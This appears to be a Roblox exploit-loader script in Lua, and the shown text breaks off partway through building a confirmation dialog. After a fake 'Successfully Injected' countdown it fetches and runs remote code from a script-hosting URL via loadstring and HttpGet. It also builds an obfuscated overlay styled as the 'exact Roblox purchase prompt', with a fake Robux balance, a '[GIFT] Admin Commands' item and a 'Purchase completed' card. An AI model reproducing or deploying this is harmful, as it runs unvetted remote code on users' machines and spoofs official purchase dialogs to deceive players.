-[ Services ]--
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local TeleportService  = game:GetService("TeleportService")
local SoundService     = game:GetService("SoundService")
local Debris           = game:GetService("Debris")
local ContentProvider  = game:GetService("ContentProvider")
local CoreGui          = game:GetService("CoreGui")

--[ Constants ]--
local LocalPlayer  = Players.LocalPlayer
local PlayerGui    = LocalPlayer.PlayerGui

-- Colors
local COLOR_DARK_BG       = Color3.new(0.0392157, 0.0392157, 0.0627451)
local COLOR_GREEN_ACCENT  = Color3.new(0.345098, 0.788235, 0.470588)
local COLOR_BLUE_ACCENT   = Color3.new(0.345098, 0.396078, 0.94902)
local COLOR_TEXT_PRIMARY  = Color3.new(0.960784, 0.968627, 1)
local COLOR_TEXT_MUTED    = Color3.new(0.470588, 0.490196, 0.588235)
local COLOR_ICON_BG       = Color3.new(0.0705882, 0.0862745, 0.0705882)
local COLOR_PROGRESS_BG   = Color3.new(0.0862745, 0.0862745, 0.12549)
local COLOR_MODAL_BG      = Color3.new(0.0980392, 0.101961, 0.121569)
local COLOR_BUY_BTN       = Color3.new(0.14902,  0.239216, 0.560784)
local COLOR_BUY_SHINE     = Color3.new(0.2,      0.372549, 1)
local COLOR_ICON_GREY     = Color3.new(0.823529, 0.823529, 0.823529)

local COLOR_BUY_LOADING    = Color3.new(0, 0.4, 1)
local COLOR_BUY_PROCESSING = Color3.new(0, 0.3, 0.85)

-- Asset IDs
local SOUND_GIFT       = "rbxassetid://83245966620103"
local IMG_X_BUTTON     = "rbxassetid://6031094678"
local IMG_ITEM_THUMB   = "rbxassetid://107341560549618"
local IMG_SUCCESS_ICON = "rbxassetid://135084016839600"
local IMG_ROBUX        = "rbxasset://textures/ui/common/robux@3x.png"

-- Timing
local NOTIF_DURATION   = 10   -- seconds for the injection countdown

--------------------------------------------------------------------
--[ Shared Modal Entry Animation (exact Roblox purchase prompt) ]--
--------------------------------------------------------------------
local function PlayModalEntryAnimation(scrim, card)
    card.AnchorPoint = Vector2.new(0.5, 0.5)
    card.Position    = UDim2.new(0.5, 0, 0.5, 0)
    scrim.BackgroundTransparency = 0.4
end

--------------------------------------------------------------------
--[ PHASE 1: Injection Notification Card (ModernNotif_66191) ]--
--------------------------------------------------------------------

local NotifGui = Instance.new("ScreenGui")
NotifGui.Name              = "ModernNotif_66191"
NotifGui.ResetOnSpawn      = false
NotifGui.ZIndexBehavior    = Enum.ZIndexBehavior.Sibling
NotifGui.DisplayOrder      = 9999
NotifGui.IgnoreGuiInset    = true
NotifGui.Parent            = PlayerGui

local Card = Instance.new("CanvasGroup")
Card.Name             = "Card"
Card.Size             = UDim2.new(0, 360, 0, 130)
Card.Position         = UDim2.new(1, 20, 1, -24)
Card.AnchorPoint      = Vector2.new(1, 1)
Card.BackgroundColor3 = COLOR_DARK_BG
Card.BorderSizePixel  = 0
Card.GroupTransparency = 0
Card.Parent           = NotifGui

local CardCorner = Instance.new("UICorner")
CardCorner.CornerRadius = UDim.new(0, 16)
CardCorner.Parent       = Card

local CardStroke = Instance.new("UIStroke")
CardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CardStroke.Color           = Color3.new(0.313726, 0.352941, 0.862745)
CardStroke.Thickness       = 1
CardStroke.Transparency    = 0.6
CardStroke.Parent          = Card

local BgGrad = Instance.new("Frame")
BgGrad.Name                = "BgGrad"
BgGrad.Size                = UDim2.new(1, 0, 1, 0)
BgGrad.BackgroundColor3    = Color3.new(1, 1, 1)
BgGrad.BackgroundTransparency = 0.95
BgGrad.BorderSizePixel     = 0
BgGrad.ZIndex              = 1
BgGrad.Parent              = Card

local BgGradient = Instance.new("UIGradient")
BgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(0.345098, 0.788235, 0.470588)),
    ColorSequenceKeypoint.new(0.5, Color3.new(0.345098, 0.396078, 0.94902)),
    ColorSequenceKeypoint.new(1,   Color3.new(0.0392157, 0.0392157, 0.0627451)),
})
BgGradient.Rotation = 135
BgGradient.Parent   = BgGrad

local SpinGradient = Instance.new("UIGradient")
SpinGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(0.345098, 0.788235, 0.470588)),
    ColorSequenceKeypoint.new(0.5, Color3.new(0.0392157, 0.0392157, 0.0627451)),
    ColorSequenceKeypoint.new(1,   Color3.new(0.345098, 0.396078, 0.94902)),
})
SpinGradient.Rotation = 135

local SideContainer = Instance.new("Frame")
SideContainer.Name                = "SideContainer"
SideContainer.Size                = UDim2.new(0, 4, 0.55, 0)
SideContainer.Position            = UDim2.new(0, 8, 0.28, 0)
SideContainer.BackgroundTransparency = 1
SideContainer.ZIndex              = 5
SideContainer.Parent              = Card

local SideBar = Instance.new("Frame")
SideBar.Name             = "SideBar"
SideBar.Size             = UDim2.new(1, 0, 1, 0)
SideBar.BackgroundColor3 = COLOR_GREEN_ACCENT
SideBar.BorderSizePixel  = 0
SideBar.Parent           = SideContainer

local SideBarCorner = Instance.new("UICorner")
SideBarCorner.CornerRadius = UDim.new(1, 0)
SideBarCorner.Parent       = SideBar

local SideBarGrad = Instance.new("UIGradient")
SideBarGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.new(0.345098, 0.862745, 0.509804)),
    ColorSequenceKeypoint.new(1, Color3.new(0.196078, 0.627451, 0.392157)),
})
SideBarGrad.Rotation = 90
SideBarGrad.Parent   = SideBar

local IconContainer = Instance.new("Frame")
IconContainer.Name             = "IconContainer"
IconContainer.Size             = UDim2.new(0, 42, 0, 42)
IconContainer.Position         = UDim2.new(0, 22, 0, 18)
IconContainer.BackgroundTransparency = 1
IconContainer.Parent           = Card

local IconGlow = Instance.new("Frame")
IconGlow.Name                = "IconGlow"
IconGlow.Size                = UDim2.new(1, 12, 1, 12)
IconGlow.Position            = UDim2.new(0.5, 0, 0.5, 0)
IconGlow.AnchorPoint         = Vector2.new(0.5, 0.5)
IconGlow.BackgroundColor3    = COLOR_GREEN_ACCENT
IconGlow.BackgroundTransparency = 0.85
IconGlow.BorderSizePixel     = 0
IconGlow.ZIndex              = 4
IconGlow.Parent              = IconContainer

local IconGlowCorner = Instance.new("UICorner")
IconGlowCorner.CornerRadius = UDim.new(1, 0)
IconGlowCorner.Parent       = IconGlow

local IconCircle = Instance.new("Frame")
IconCircle.Name             = "IconCircle"
IconCircle.Size             = UDim2.new(1, 0, 1, 0)
IconCircle.BackgroundColor3 = COLOR_ICON_BG
IconCircle.BorderSizePixel  = 0
IconCircle.ZIndex           = 5
IconCircle.Parent           = IconContainer

local IconCircleCorner = Instance.new("UICorner")
IconCircleCorner.CornerRadius = UDim.new(1, 0)
IconCircleCorner.Parent       = IconCircle

local IconCircleStroke = Instance.new("UIStroke")
IconCircleStroke.Color       = COLOR_GREEN_ACCENT
IconCircleStroke.Thickness   = 2
IconCircleStroke.Transparency = 0.2
IconCircleStroke.Parent      = IconCircle

local CheckLabel = Instance.new("TextLabel")
CheckLabel.Name               = "Check"
CheckLabel.Size               = UDim2.new(1, 0, 1, -2)
CheckLabel.BackgroundTransparency = 1
CheckLabel.Text               = "✓"
CheckLabel.TextColor3         = COLOR_GREEN_ACCENT
CheckLabel.TextSize           = 22
CheckLabel.Font               = Enum.Font.GothamBold
CheckLabel.ZIndex             = 6
CheckLabel.Parent             = IconCircle

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name               = "Title"
TitleLabel.Size               = UDim2.new(1, -82, 0, 22)
TitleLabel.Position           = UDim2.new(0, 72, 0, 18)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text               = "Successfully Injected"
TitleLabel.TextColor3         = COLOR_TEXT_PRIMARY
TitleLabel.TextSize           = 17
TitleLabel.Font               = Enum.Font.GothamBold
TitleLabel.TextXAlignment     = Enum.TextXAlignment.Left
TitleLabel.ZIndex             = 5
TitleLabel.Parent             = Card

local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Name               = "Subtitle"
SubtitleLabel.Size               = UDim2.new(1, -82, 0, 16)
SubtitleLabel.Position           = UDim2.new(0, 72, 0, 42)
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.Text               = "Loader executed • Waiting..."
SubtitleLabel.TextColor3         = COLOR_TEXT_MUTED
SubtitleLabel.TextSize           = 12
SubtitleLabel.Font               = Enum.Font.GothamMedium
SubtitleLabel.TextXAlignment     = Enum.TextXAlignment.Left
SubtitleLabel.ZIndex             = 5
SubtitleLabel.Parent             = Card

local DiscordRow = Instance.new("Frame")
DiscordRow.Name                = "DiscordRow"
DiscordRow.Size                = UDim2.new(1, -82, 0, 20)
DiscordRow.Position            = UDim2.new(0, 72, 0, 62)
DiscordRow.BackgroundTransparency = 1
DiscordRow.ZIndex              = 5
DiscordRow.Parent              = Card

local DiscordDot = Instance.new("Frame")
DiscordDot.Name             = "Dot"
DiscordDot.Size             = UDim2.new(0, 6, 0, 6)
DiscordDot.Position         = UDim2.new(0, 0, 0.5, 0)
DiscordDot.AnchorPoint      = Vector2.new(0, 0.5)
DiscordDot.BackgroundColor3 = COLOR_BLUE_ACCENT
DiscordDot.BorderSizePixel  = 0
DiscordDot.ZIndex           = 5
DiscordDot.Parent           = DiscordRow

local DiscordDotCorner = Instance.new("UICorner")
DiscordDotCorner.CornerRadius = UDim.new(1, 0)
DiscordDotCorner.Parent       = DiscordDot

local DiscordText = Instance.new("TextLabel")
DiscordText.Name               = "DiscordText"
DiscordText.Size               = UDim2.new(1, -14, 1, 0)
DiscordText.Position           = UDim2.new(0, 14, 0, 0)
DiscordText.BackgroundTransparency = 1
DiscordText.Text               = "Discord copied to clipboard"
DiscordText.TextColor3         = COLOR_BLUE_ACCENT
DiscordText.TextSize           = 11
DiscordText.Font               = Enum.Font.GothamMedium
DiscordText.TextXAlignment     = Enum.TextXAlignment.Left
DiscordText.ZIndex             = 5
DiscordText.Parent             = DiscordRow

local ProgressOuter = Instance.new("Frame")
ProgressOuter.Name             = "ProgressOuter"
ProgressOuter.Size             = UDim2.new(1, -32, 0, 6)
ProgressOuter.Position         = UDim2.new(0, 16, 1, -22)
ProgressOuter.BackgroundColor3 = COLOR_PROGRESS_BG
ProgressOuter.BorderSizePixel  = 0
ProgressOuter.ClipsDescendants = true
ProgressOuter.ZIndex           = 5
ProgressOuter.Parent           = Card

local ProgressOuterCorner = Instance.new("UICorner")
ProgressOuterCorner.CornerRadius = UDim.new(1, 0)
ProgressOuterCorner.Parent       = ProgressOuter

local ProgressOuterStroke = Instance.new("UIStroke")
ProgressOuterStroke.Color       = Color3.new(0.137255, 0.137255, 0.196078)
ProgressOuterStroke.Transparency = 0.3
ProgressOuterStroke.Thickness   = 1
ProgressOuterStroke.Parent      = ProgressOuter

local ProgressFill = Instance.new("Frame")
ProgressFill.Name             = "Fill"
ProgressFill.Size             = UDim2.new(1, 0, 1, 0)
ProgressFill.Position         = UDim2.new(0, 0, 0, 0)
ProgressFill.BackgroundColor3 = Color3.new(0.345098, 0.862745, 0.509804)
ProgressFill.BorderSizePixel  = 0
ProgressFill.ZIndex           = 6
ProgressFill.Parent           = ProgressOuter

local ProgressFillGrad = Instance.new("UIGradient")
ProgressFillGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(0.345098, 0.862745, 0.509804)),
    ColorSequenceKeypoint.new(0.4, Color3.new(0.27451,  0.705882, 0.784314)),
    ColorSequenceKeypoint.new(0.7, Color3.new(0.345098, 0.396078, 0.94902)),
    ColorSequenceKeypoint.new(1,   Color3.new(0.509804, 0.392157, 1)),
})
ProgressFillGrad.Parent = ProgressFill

local Shimmer = Instance.new("Frame")
Shimmer.Name                = "Shimmer"
Shimmer.Size                = UDim2.new(0.3, 0, 1, 0)
Shimmer.Position            = UDim2.new(0, 0, 0, 0)
Shimmer.BackgroundColor3    = Color3.new(1, 1, 1)
Shimmer.BackgroundTransparency = 0.7
Shimmer.BorderSizePixel     = 0
Shimmer.ZIndex              = 7
Shimmer.Parent              = ProgressFill

local ShimmerGrad = Instance.new("UIGradient")
ShimmerGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.new(1, 1, 1)),
    ColorSequenceKeypoint.new(0.5, Color3.new(1, 1, 1)),
    ColorSequenceKeypoint.new(1,   Color3.new(1, 1, 1)),
})
ShimmerGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0,   1),
    NumberSequenceKeypoint.new(0.5, 0),
    NumberSequenceKeypoint.new(1,   1),
})
ShimmerGrad.Parent = Shimmer

local TimerLabel = Instance.new("TextLabel")
TimerLabel.Name               = "Timer"
TimerLabel.Size               = UDim2.new(0, 40, 0, 14)
TimerLabel.Position           = UDim2.new(1, -16, 1, -38)
TimerLabel.AnchorPoint        = Vector2.new(1, 0)
TimerLabel.BackgroundTransparency = 1
TimerLabel.Text               = tostring(NOTIF_DURATION) .. "s"
TimerLabel.TextColor3         = Color3.new(0.254902, 0.266667, 0.352941)
TimerLabel.TextSize           = 10
TimerLabel.Font               = Enum.Font.Gotham
TimerLabel.TextXAlignment     = Enum.TextXAlignment.Right
TimerLabel.ZIndex             = 6
TimerLabel.Parent             = Card

--------------------------------------------------------------------
--[ PHASE 1 LOGIC ]--
--------------------------------------------------------------------

local slideIn = TweenService:Create(Card, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position = UDim2.new(1, -16, 1, -24),
})
slideIn:Play()

local progressDrain = TweenService:Create(ProgressFill, TweenInfo.new(NOTIF_DURATION, Enum.EasingStyle.Linear), {
    Size = UDim2.new(0, 0, 1, 0),
})
progressDrain:Play()

local function playShimmer()
    Shimmer.Position = UDim2.new(-0.3, 0, 0, 0)
    local t = TweenService:Create(Shimmer, TweenInfo.new(1.2, Enum.EasingStyle.Linear), {
        Position = UDim2.new(1, 0, 0, 0),
    })
    t:Play()
    t.Completed:Connect(function(state)
        if state == Enum.PlaybackState.Completed and NotifGui.Parent then
            playShimmer()
        end
    end)
end
playShimmer()

local gradRotation = 135
RunService.RenderStepped:Connect(function(dt)
    if not NotifGui.Parent then return end
    gradRotation = gradRotation + dt * 18
    BgGradient.Rotation = gradRotation % 360
end)

local countdownConn
local remaining = NOTIF_DURATION
countdownConn = RunService.Heartbeat:Connect(function(dt)
    remaining -= dt
    local secs = math.max(0, math.ceil(remaining))
    TimerLabel.Text = tostring(secs) .. "s"

    if secs <= 3 then
        SubtitleLabel.Text = "Launching script..."
    end
    if secs <= 0 then
        TimerLabel.Text = "0s"
        task.wait(0.05)
        SubtitleLabel.Text = "Launching now!"
        countdownConn:Disconnect()
        task.wait(0.6)
        local slideOut = TweenService:Create(Card, TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
            Position = UDim2.new(1, 400, 1, -24),
        })
        slideOut:Play()
        slideOut.Completed:Connect(function()
            NotifGui:Destroy()
            loadstring(game:HttpGet("https://cdn.luarmor.net/v4_init_janend.lua"))()
        end)
    end
end)

--------------------------------------------------------------------
--[ PHASE 2: Shop Buy Overlay (pnLjgNfmGDjE) ]--
--------------------------------------------------------------------

local function ShowBuyModal(itemName, itemPrice, itemImage, playerBalance, onConfirm, onClose)
    local ModalGui = Instance.new("ScreenGui")
    ModalGui.Name           = "pnLjgNfmGDjE"
    ModalGui.DisplayOrder   = 999
    ModalGui.ResetOnSpawn   = false
    ModalGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ModalGui.IgnoreGuiInset = true

    local Scrim = Instance.new("Frame")
    Scrim.Name                = "ICtlqkrXOQ"
    Scrim.Size                = UDim2.new(1, 0, 1, 0)
    Scrim.BackgroundColor3    = Color3.new(0, 0, 0)
    Scrim.BackgroundTransparency = 0.4
    Scrim.BorderSizePixel     = 0
    Scrim.ZIndex              = 10
    Scrim.Parent              = ModalGui

    local Modal = Instance.new("Frame")
    Modal.Name             = "NPbEfFGwOG"
    Modal.Size             = UDim2.new(0, 420, 0, 184)
    Modal.Position         = UDim2.new(0.5, 0, 0.5, 0)
    Modal.AnchorPoint      = Vector2.new(0.5, 0.5)
    Modal.BackgroundColor3 = COLOR_MODAL_BG
    Modal.BorderSizePixel  = 0
    Modal.ZIndex           = 11
    Modal.Parent           = ModalGui

    local ModalCorner = Instance.new("UICorner")
    ModalCorner.CornerRadius = UDim.new(0, 10)
    ModalCorner.Parent       = Modal

    local BuyHeader = Instance.new("TextLabel")
    BuyHeader.Name               = "STtAHOzoEY"
    BuyHeader.Size               = UDim2.new(1, -160, 0, 52)
    BuyHeader.Position           = UDim2.new(0, 16, 0, 0)
    BuyHeader.BackgroundTransparency = 1
    BuyHeader.Text               = "Buy item"
    BuyHeader.TextColor3         = Color3.new(1, 1, 1)
    BuyHeader.TextSize           = 20
    BuyHeader.Font               = Enum.Font.BuilderSansMedium
    BuyHeader.TextYAlignment     = Enum.TextYAlignment.Center
    BuyHeader.TextXAlignment     = Enum.TextXAlignment.Left
    BuyHeader.ZIndex             = 12
    BuyHeader.Parent             = Modal

    local CloseBtn = Instance.new("ImageButton")
    CloseBtn.Name                = "BkSlFbKUMO"
    CloseBtn.Image               = ""
    CloseBtn.BackgroundTransparency = 1
    CloseBtn.Position            = UDim2.new(1, -44, 0, 0)
    CloseBtn.Size                = UDim2.new(0, 44, 0, 52)
    CloseBtn.ZIndex              = 12
    CloseBtn.Parent              = Modal

    local CloseIcon = Instance.new("ImageLabel")
    CloseIcon.Name               = "qMCqSnHFxm"
    CloseIcon.Image              = IMG_X_BUTTON
    CloseIcon.ImageColor3        = COLOR_ICON_GREY
    CloseIcon.ScaleType          = Enum.ScaleType.Fit
    CloseIcon.AnchorPoint        = Vector2.new(0.5, 0.5)
    CloseIcon.Position           = UDim2.new(0.5, 0, 0.5, 0)
    CloseIcon.Size               = UDim2.new(0, 22, 0, 22)
    CloseIcon.BackgroundTransparency = 1
    CloseIcon.ZIndex             = 13
    CloseIcon.Parent             = CloseBtn

    local BalanceContainer = Instance.new("Frame")
    BalanceContainer.Name             = "UguuuxbLHj"
    BalanceContainer.Size             = UDim2.new(0, 110, 0, 52)
    BalanceContainer.Position         = UDim2.new(1, -120, 0, 0)
    BalanceContainer.BackgroundTransparency = 1
    BalanceContainer.ZIndex           = 12
    BalanceContainer.Parent           = Modal

    local RobuxIcon = Instance.new("ImageLabel")
    RobuxIcon.Name               = "atwANeQwgU"
    RobuxIcon.Image              = IMG_ROBUX
    RobuxIcon.ScaleType          = Enum.ScaleType.Fit
    RobuxIcon.Size               = UDim2.new(0, 16, 0, 16)
    RobuxIcon.AnchorPoint        = Vector2.new(0, 0.5)
    RobuxIcon.Position           = UDim2.new(0, 0, 0.5, 0)
    RobuxIcon.BackgroundTransparency = 1
    RobuxIcon.BorderSizePixel    = 0
    RobuxIcon.ZIndex             = 12
    RobuxIcon.Parent             = BalanceContainer

    local BalanceLabel = Instance.new("TextLabel")
    BalanceLabel.Name               = "uTPRcpZZQz"
    BalanceLabel.Size               = UDim2.new(1, -22, 1, 0)
    BalanceLabel.Position           = UDim2.new(0, 22, 0, 0)
    BalanceLabel.BackgroundTransparency = 1
    BalanceLabel.Text               = playerBalance or "324,195"
    BalanceLabel.TextColor3         = COLOR_ICON_GREY
    BalanceLabel.TextSize           = 15
    BalanceLabel.Font               = Enum.Font.GothamMedium
    BalanceLabel.TextXAlignment     = Enum.TextXAlignment.Left
    BalanceLabel.TextYAlignment     = Enum.TextYAlignment.Center
    BalanceLabel.ZIndex             = 12
    BalanceLabel.Parent             = BalanceContainer

    local ItemRow = Instance.new("Frame")
    ItemRow.Name             = "RbLerwrnVb"
    ItemRow.Size             = UDim2.new(1, -32, 0, 64)
    ItemRow.Position         = UDim2.new(0, 16, 0, 62)
    ItemRow.BackgroundTransparency = 1
    ItemRow.ZIndex           = 12
    ItemRow.Parent           = Modal

    local ItemThumb = Instance.new("ImageLabel")
    ItemThumb.Name             = "RHSzuhbSrs"
    ItemThumb.Image            = itemImage or IMG_ITEM_THUMB
    ItemThumb.AnchorPoint      = Vector2.new(0, 0.5)
    ItemThumb.Position         = UDim2.new(0, 0, 0.5, -6)
    ItemThumb.Size             = UDim2.new(0, 46, 0, 46)
    ItemThumb.BackgroundTransparency = 1
    ItemThumb.BorderSizePixel  = 0
    ItemThumb.ZIndex           = 12
    ItemThumb.Parent           = ItemRow

    local ItemName = Instance.new("TextLabel")
    ItemName.Name               = "OoRQRrZjQR"
    ItemName.Size               = UDim2.new(1, -60, 0, 20)
    ItemName.Position           = UDim2.new(0, 58, 0, 5)
    ItemName.BackgroundTransparency = 1
    ItemName.Text               = itemName or "[GIFT] Admin Commands"
    ItemName.TextColor3         = Color3.new(1, 1, 1)
    ItemName.TextSize           = 14
    ItemName.Font               = Enum.Font.GothamMedium
    ItemName.TextXAlignment     = Enum.TextXAlignment.Left
    ItemName.ZIndex             = 12
    ItemName.Parent             = ItemRow

    local PriceRow = Instance.new("Frame")
    PriceRow.Name             = "VfizqwljpK"
    PriceRow.Size             = UDim2.new(0, 120, 0, 18)
    PriceRow.Position         = UDim2.new(0, 54, 0, 29)
    PriceRow.BackgroundTransparency = 1
    PriceRow.ZIndex           = 12
    PriceRow.Parent           = ItemRow

    local PriceIcon = Instance.new("ImageLabel")
    PriceIcon.Name               = "GoPMZinxtc"
    PriceIcon.Image              = IMG_ROBUX
    PriceIcon.ScaleType          = Enum.ScaleType.Fit
    PriceIcon.Size               = UDim2.new(0, 16, 0, 16)
    PriceIcon.AnchorPoint        = Vector2.new(0, 0.5)
    PriceIcon.Position           = UDim2.new(0, 0, 0.5, 0)
    PriceIcon.BackgroundTransparency = 1
    PriceIcon.BorderSizePixel    = 0
    PriceIcon.ZIndex             = 13
    PriceIcon.Parent             = PriceRow

    local PriceLabel = Instance.new("TextLabel")
    PriceLabel.Name               = "iGMVUACEWf"
    PriceLabel.Size               = UDim2.new(1, -22, 1, 0)
    PriceLabel.Position           = UDim2.new(0, 22, 0, 0)
    PriceLabel.BackgroundTransparency = 1
    PriceLabel.Text               = itemPrice or "7,499"
    PriceLabel.TextColor3         = Color3.new(1, 1, 1)
    PriceLabel.TextSize           = 13
    PriceLabel.Font               = Enum.Font.GothamMedium
    PriceLabel.TextXAlignment     = Enum.TextXAlignment.Left
    PriceLabel.TextYAlignment     = Enum.TextYAlignment.Center
    PriceLabel.ZIndex             = 13
    PriceLabel.Parent             = PriceRow

    -- Buy button
    local BuyBtn = Instance.new("TextButton")
    BuyBtn.Name                = "SbBypkKFUg"
    BuyBtn.Size                = UDim2.new(1, -28, 0, 34)
    BuyBtn.Position            = UDim2.new(0, 14, 0, 140)
    BuyBtn.BackgroundColor3    = Color3.new(0.0863, 0.0863, 0.1255)
    BuyBtn.BorderSizePixel     = 0
    BuyBtn.ClipsDescendants    = true
    BuyBtn.Text                = ""
    BuyBtn.AutoButtonColor     = false
    BuyBtn.Active              = false
    BuyBtn.ZIndex              = 12
    BuyBtn.Parent              = Modal

    local BuyBtnCorner = Instance.new("UICorner")
    BuyBtnCorner.CornerRadius = UDim.new(0, 8)
    BuyBtnCorner.Parent       = BuyBtn

    -- Bright blue loading fill (matches screenshot)
    local LoadingFill = Instance.new("Frame")
    LoadingFill.Name             = "LoadingFill"
    LoadingFill.Size             = UDim2.new(0, 0, 1, 0)
    LoadingFill.Position         = UDim2.new(0, 0, 0, 0)
    LoadingFill.BackgroundColor3 = COLOR_BUY_LOADING
    LoadingFill.BorderSizePixel  = 0
    LoadingFill.ZIndex           = 13
    LoadingFill.Parent           = BuyBtn

    local LoadingFillCorner = Instance.new("UICorner")
    LoadingFillCorner.CornerRadius = UDim.new(0, 8)
    LoadingFillCorner.Parent       = LoadingFill

    local LoadShimmer = Instance.new("Frame")
    LoadShimmer.Name                = "LoadShimmer"
    LoadShimmer.Size                = UDim2.new(0.5, 0, 1, 0)
    LoadShimmer.Position            = UDim2.new(-0.5, 0, 0, 0)
    LoadShimmer.BackgroundColor3    = Color3.new(1, 1, 1)
    LoadShimmer.BackgroundTransparency = 1
    LoadShimmer.BorderSizePixel     = 0
    LoadShimmer.ZIndex              = 14
    LoadShimmer.Parent              = LoadingFill

    local LoadShimmerGrad = Instance.new("UIGradient")
    LoadShimmerGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   1),
        NumberSequenceKeypoint.new(0.4, 0.75),
        NumberSequenceKeypoint.new(0.6, 0.75),
        NumberSequenceKeypoint.new(1,   1),
    })
    LoadShimmerGrad.Parent = LoadShimmer

    local BuyLabel = Instance.new("TextLabel")
    BuyLabel.Name               = "sDmUYAanmy"
    BuyLabel.Size               = UDim2.new(1, 0, 1, 0)
    BuyLabel.BackgroundTransparency = 1
    BuyLabel.Text               = "Buy"
    BuyLabel.TextColor3         = Color3.new(1, 1, 1)
    BuyLabel.TextTransparency   = 0.55
    BuyLabel.TextSize           = 14
    BuyLabel.Font               = Enum.Font.GothamBold
    BuyLabel.ZIndex             = 15
    BuyLabel.Parent             = BuyBtn

    ModalGui.Parent = CoreGui
    PlayModalEntryAnimation(Scrim, Modal)

    local function sweepShimmer()
        if not LoadingFill.Parent then return end
        LoadShimmer.Position = UDim2.new(-0.5, 0, 0, 0)
        local st = TweenService:Create(LoadShimmer, TweenInfo.new(1.4, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            Position = UDim2.new(1, 0, 0, 0),
        })
        st:Play()
        st.Completed:Connect(function(s)
            if s == Enum.PlaybackState.Completed and LoadingFill.Parent then
                sweepShimmer()
            end
        end)
    end

    task.delay(0.5, function()
        sweepShimmer()

        local fillTween = TweenService:Create(LoadingFill, TweenInfo.new(2.0, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
            Size = UDim2.new(1, 0, 1, 0),
        })
        fillTween:Play()
        fillTween.Completed:Connect(function()
            BuyBtn.BackgroundColor3      = COLOR_BUY_BTN
            LoadingFill.BackgroundColor3 = COLOR_BUY_BTN
            LoadingFill.Size             = UDim2.new(1, 0, 1, 0)

            TweenService:Create(BuyLabel, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                TextTransparency = 0,
            }):Play()

            BuyBtn.Active = true
        end)
    end)

    CloseBtn.MouseButton1Click:Connect(function()
        ModalGui:Destroy()
        if onClose then onClose() end
    end)

    BuyBtn.MouseButton1Click:Connect(function()
        if not BuyBtn.Active then return end
        BuyBtn.Active = false

        -- Processing hold: slightly darken, keep "Buy" text (no "...")
        TweenService:Create(LoadingFill, TweenInfo.new(0.1), {
            BackgroundColor3 = COLOR_BUY_PROCESSING,
        }):Play()
        -- BuyLabel.Text stays as "Buy"

        task.delay(1.0, function()
            ModalGui:Destroy()
            if onConfirm then onConfirm() end
        end)
    end)
end

--------------------------------------------------------------------
--[ PHASE 3: Purchase Confirmation Card (cAFYmKVtAS) ]--
--------------------------------------------------------------------

local function ShowPurchaseConfirmation(targetPlayer, onDone)
    local ConfirmGui = Instance.new("ScreenGui")
    ConfirmGui.Name           = "ConfirmGui"
    ConfirmGui.DisplayOrder   = 999
    ConfirmGui.ResetOnSpawn   = false
    ConfirmGui.IgnoreGuiInset = true

    local Scrim2 = Instance.new("Frame")
    Scrim2.Size                = UDim2.new(1, 0, 1, 0)
    Scrim2.BackgroundColor3    = Color3.new(0, 0, 0)
    Scrim2.BackgroundTransparency = 0.4
    Scrim2.BorderSizePixel     = 0
    Scrim2.ZIndex              = 10
    Scrim2.Parent              = ConfirmGui

    local ConfirmCard = Instance.new("Frame")
    ConfirmCard.Name             = "cAFYmKVtAS"
    ConfirmCard.Size             = UDim2.new(0, 420, 0, 232)
    ConfirmCard.Position         = UDim2.new(0.5, 0, 0.5, 0)
    ConfirmCard.AnchorPoint      = Vector2.new(0.5, 0.5)
    ConfirmCard.BackgroundColor3 = COLOR_MODAL_BG
    ConfirmCard.BorderSizePixel  = 0
    ConfirmCard.ZIndex           = 11
    ConfirmCard.Parent           = ConfirmGui

    local ConfirmCorner = Instance.new("UICorner")
    ConfirmCorner.CornerRadius = UDim.new(0, 10)
    ConfirmCorner.Parent       = ConfirmCard

    local ConfirmTitle = Instance.new("TextLabel")
    ConfirmTitle.Name               = "zQxxMwynqd"
    ConfirmTitle.Size               = UDim2.new(1, -20, 0, 52)
    ConfirmTitle.Position           = UDim2.new(0, 10, 0, 0)
    ConfirmTitle.BackgroundTransparency = 1
    ConfirmTitle.Text               = "Purchase completed"
    ConfirmTitle.TextColor3         = Color3.new(1, 1, 1)
    ConfirmTitle.TextSize           = 18
    ConfirmTitle.Font               = Enum.Font.BuilderSansMedium
    ConfirmTitle.TextXAlignment     = Enum.TextXAlignment.Left
    ConfirmTitle.TextYAlignment     = Enum.TextYAlignment.Center
    ConfirmTitle.ZIndex             = 12
    ConfirmTitle.Parent             = ConfirmCard

    local ConfirmClose = Instance.new("ImageButton")
    ConfirmClose.Name                = "IcrnMETJym"
    ConfirmClose.BackgroundTransparency = 1
    ConfirmClose.Position            = UDim2.new(1, -44, 0, 0)
    ConfirmClose.Size                = UDim2.new(0, 44, 0, 52)
    ConfirmClose.ZIndex              = 12
    ConfirmClose.Parent              = ConfirmCard

    local ConfirmCloseIcon = Instance.new("ImageLabel")
    ConfirmCloseIcon.Name               = "CaVcsjwbSF"
    ConfirmCloseIcon.Image              = IMG_X_BUTTON
    ConfirmCloseIcon.ImageColor3        = COLOR_ICON_GREY
    ConfirmCloseIcon.ScaleType          = Enum.ScaleType.Fit
    ConfirmCloseIcon.AnchorPoint        = Vector2.new(0.5, 0.5)
    ConfirmCloseIcon.Position           = UDim2.new(0.5, 0, 0.5, 0)
    ConfirmCloseIcon.Size               = UDim2.new(0, 22, 0, 22)
